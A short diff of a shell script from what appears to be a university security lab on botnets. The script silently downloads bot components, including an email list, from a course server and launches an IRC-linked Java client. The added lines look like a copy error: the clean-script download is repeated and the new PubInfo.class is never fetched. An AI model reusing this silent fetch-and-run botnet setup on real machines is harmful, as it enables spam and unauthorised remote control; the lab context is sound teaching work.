@@ -19,6 +19,7 @@ if [ -z "$DIR" ]; then
     EMAILS="emails.txt"
     RAND_EMAILS="random_emails.txt"
     CLEAN="clean.sh"
+    INFO="PubInfo.class"
     CURDIR=`pwd`
 
     if [ ! -d "${DIR}${FOLDER}" ]; then
@@ -39,7 +40,8 @@ if [ -z "$DIR" ]; then
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$TEMPLATE" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$EMAILS" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$CLEAN" &> /dev/null
-
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$CLEAN" &> /dev/null
+    
     cp $EMAILS $RAND_EMAILS
 
     java -classpath "${PIRC}:${APAC}:." $TARGET #&> /dev/null &
